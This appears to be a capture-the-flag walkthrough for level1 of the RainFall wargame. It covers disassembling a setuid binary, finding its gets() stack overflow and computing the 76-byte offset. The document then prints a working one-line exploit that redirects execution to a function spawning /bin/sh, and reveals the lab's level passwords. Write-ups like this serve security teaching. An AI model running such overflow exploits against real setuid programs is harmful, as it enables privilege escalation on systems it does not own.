# RainFall  – Level1 Complete Walkthrough

### 🔍 Initial Setup and Reconnaissance

#### Environment Setup

First, let's establish our working environment and examine the target:

```bash
# Login as level1
su level1
# Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

# Optional: Download binary for analysis
scp -P 4242 -r level1@10.13.249.218:/home/user/level1/level1 .
```

### Initial Binary Examination

```bash
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep  3  2015 .bashrc
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
```

### Key Observations:
- **SUID Binary**: Owned by `level2` with setuid bit (`s`)
- **Privilege Escalation**: Runs with `level2` user privileges

### Basic Functionality Test

```bash
level1@RainFall:~$ ./level1
Hello World

```

The program reads input but doesn't echo it back, suggesting it might be waiting for something specific or vulnerable to input manipulation.

---

## 🔍 Binary Analysis and Function Discovery

### Starting GDB Analysis

```bash
level1@RainFall:~$ gdb -q level1
(gdb) info functions
```

### Function Enumeration Results

```
All defined functions:

Non-debugging symbols:
0x08048340  gets@plt
0x08048350  fwrite@plt  
0x08048360  system@plt
0x08048444  run
0x08048480  main
```

### Critical Findings:

| Function | Address | Type | Purpose |
|----------|---------|------|---------|
| `gets@plt` | 0x08048340 | Library | **Vulnerable** input function |
| `fwrite@plt` | 0x08048350 | Library | Output function |
| `system@plt` | 0x08048360 | Library | Command execution |
| `run` | 0x08048444 | **Custom** | **Target function** |
| `main` | 0x08048480 | **Custom** | Entry point |

### Initial Assessment:
- ✅ `gets()` function present → **Buffer overflow vulnerability likely**
- ✅ `system()` function available → **Shell execution possible**
- ✅ Custom `run()` function → **Potential backdoor**

---

## 🚨 Vulnerability Assessment

### Main Function Analysis

```bash
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp      # Stack alignment
   0x08048486 <+6>:	sub    $0x50,%esp            # Allocate 80 bytes
   0x08048489 <+9>:	lea    0x10(%esp),%eax       # Buffer at ESP+16
   0x0804848d <+13>:	mov    %eax,(%esp)           # Pass buffer to gets
   0x08048490 <+16>:	call   0x8048340 <gets@plt>  # VULNERABLE gets() call
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
```

### Vulnerability Analysis:

1. **Buffer Overflow**: `gets()` reads unlimited input into fixed buffer
2. **No Bounds Checking**: No validation of input length
3. **Stack Corruption Possible**: Can overwrite return address
4. **Direct Exploitation Path**: Can redirect execution to `run()` function

---

## 🧠 Memory Layout Analysis

### Stack Frame Calculation

From the disassembly:
- `sub $0x50, %esp` → Allocates **80 bytes** (0x50 = 80)
- `lea 0x10(%esp), %eax` → Buffer starts at **ESP+16**
- **Buffer size** = 80 - 16 = **64 bytes**

### Detailed Stack Layout

```
Stack Layout During main() Execution:

Higher Memory Addresses
┌─────────────────────┐
│   Return Address    │  ← ESP+80 (EBP+4) - Target for overwrite
├─────────────────────┤
│    Saved EBP        │  ← ESP+76 (EBP+0)
├─────────────────────┤
│                     │
│   Unused Space      │  ← ESP+16 to ESP+75 (60 bytes)
│   (Stack Padding)   │
│                     │
├─────────────────────┤
│                     │
│   Input Buffer      │  ← ESP+16 (gets() writes here)
│    [64 bytes]       │     Buffer size calculation:
│                     │     80 total - 16 offset = 64 bytes
└─────────────────────┘
Lower Memory Addresses
```

### Memory Address Mapping

```
Byte Position    Content              Description
─────────────────────────────────────────────────────────
0-63            [User Input]         Buffer content
64-67           [Saved EBP]          Previous frame pointer
68-71           [Return Address]     Where main() returns to
72+             [Stack continues]    Additional stack content
```

### Buffer Overflow Impact Visualization

```
Normal Execution:
┌─────────────┐
│   Input     │ ← 64 bytes or less
│   (Safe)    │
├─────────────┤
│ Saved EBP   │ ← Intact
├─────────────┤
│ Return Addr │ ← Points to legitimate code
└─────────────┘

Buffer Overflow:
┌─────────────┐
│AAAAAAAAAAAAA│ ← 76+ bytes of input
│AAAAAAAAAAAAA│
├─────────────┤
│    AAAA     │ ← EBP overwritten
├─────────────┤
│  run() addr │ ← Return address hijacked
└─────────────┘
```

---

## 🎯 Target Function Analysis

### Analyzing the `run()` Function

```bash
(gdb) disassemble run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax      # "Good... Wait what?" string
   0x08048456 <+18>:	movl   $0x13,0x8(%esp)      # Length = 19 bytes
   0x0804845e <+26>:	mov    %edx,0x4(%esp)       # stderr stream
   0x08048462 <+30>:	mov    %eax,(%esp)          # String pointer
   0x08048465 <+33>:	call   0x8048350 <fwrite@plt>
   0x0804846a <+38>:	movl   $0x8048584,(%esp)    # "/bin/sh" string
   0x08048471 <+45>:	call   0x8048360 <system@plt>  # Execute shell!
   0x08048476 <+50>:	leave  
   0x08048477 <+51>:	ret    
End of assembler dump.
```

### Function Behavior Analysis:

1. **Message Display**: Prints "Good... Wait what?" to stderr
2. **Shell Execution**: Calls `system("/bin/sh")`
3. **Privilege Escalation**: Runs with level2 privileges (SUID)



### String Analysis:
```bash
(gdb) x/s 0x8048570
0x8048570:	"Good... Wait what?"

(gdb) x/s 0x8048584  
0x8048584:	"/bin/sh"
```

---

## 🔢 Overflow Offset Calculation

### Using Pattern Generation (PEDA Method)

If you have GDB with PEDA extension:

```bash
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

gdb-peda$ run
Starting program: /home/user/level1/level1 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
```

### Crash Analysis:

```bash
gdb-peda$ info registers
EAX: 0xffffcdc0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBP: 0x41344141 ('AA4A')
ESP: 0xffffcdc0 ("AJAAfAA5AAKAAgAA6AAL")
EIP: 0x41344141 ('AA4A')
```

### Pattern Search:

```bash
gdb-peda$ pattern search
Registers contain pattern buffer:
EBP+0 found at offset: 72
EIP+0 found at offset: 76
```

### Manual Method :

```bash
# Test with incremental sizes
python -c 'print "A" * 64' | ./level1    # No crash
python -c 'print "A" * 72' | ./level1    # No crash  
python -c 'print "A" * 76' | ./level1    # Crash
```

### Offset Confirmation:

**Buffer Layout Confirmed:**
- Bytes 0-63: Buffer content (64 bytes)
- Bytes 64-67: Saved EBP (4 bytes)  
- Bytes 68-71: Alignment/Padding (4 bytes)
- Bytes 72-75: Return Address (4 bytes) ← **Offset 76**

---

## 💻 Exploit Development

### Exploitation Strategy

We need to:
1. **Fill buffer** with 76 bytes of padding
2. **Overwrite return address** with `run()` function address
3. **Maintain stack alignment** for proper execution

### Address Verification

```bash
(gdb) print run
$1 = {<text variable, no debug info>} 0x8048444 <run>

(gdb) x/i 0x8048444
   0x8048444 <run>:	push   %ebp
```

**Target Address**: `0x08048444`

### Little-Endian Conversion

x86 architecture uses little-endian byte ordering:
- Address: `0x08048444`
- Little-endian bytes: `\x44\x84\x04\x08`

#### Using Python's struct Module

You can also use Python's `struct.pack()` function to convert addresses:

```python
>>> import struct
>>> struct.pack("I", 0x08048444)
b'D\x84\x04\x08'
```

**Note**: The output shows `D` instead of `\x44` because:
- `\x44` (hex) = 68 (decimal) = `D` (ASCII character)
- Python displays printable ASCII characters as their character representation
- The other bytes (`\x84`, `\x04`, `\x08`) remain as hex because they're non-printable

The `"I"` format specifier represents an unsigned 32-bit integer in little-endian format.

### Payload Architecture

```
Payload Structure:
┌─────────────────┐
│  Padding        │  ← 76 bytes of any data
│  (76 bytes)     │
├─────────────────┤
│  run() Address  │  ← \x44\x84\x04\x08 (little-endian)
│  (4 bytes)      │
└─────────────────┘
Total: 80 bytes
```


---

## 🚀 Execution and Flag Retrieval

### The Critical Detail: Keeping stdin Open

**Wrong approach** (stdin closes immediately):
```bash
python -c 'print "A"*76 + "\x44\x84\x04\x08"' | ./level1
```

**Correct approach** (stdin remains open):
```bash
(python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

### Why the Difference Matters:

#### Without `cat` (Broken):
```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   python    │───▶│   level1    │───▶│ system()    │
│   payload   │    │  overflow   │    │ /bin/sh     │
└─────────────┘    └─────────────┘    └─────────────┘
                                            │
                                            ▼
                                     ┌─────────────┐
                                     │stdin closed │
                                     │shell exits  │
                                     │immediately  │
                                     └─────────────┘
```

#### With `cat` (Working):
```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   python    │───▶│   level1    │───▶│ system()    │
│   payload   │    │  overflow   │    │ /bin/sh     │
└─────────────┘    └─────────────┘    └─────────────┘
       │                                     │
       ▼                                     ▼
┌─────────────┐                       ┌─────────────┐
│     cat     │──────stdin open────────▶│ Interactive │
│  (waiting)  │                       │    shell    │
└─────────────┘                       └─────────────┘
```

### Successful Execution

```bash
level1@RainFall:~$ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
```

At this point, you have an interactive shell with level2 privileges!

### Retrieving the Flag

```bash
# Now we have shell as level2 user
whoami
level2

ls /home/user/level2/
.bash_logout  .bashrc  .profile  level2

cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

---

## 🎉 Success!

**Flag for level2**: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`

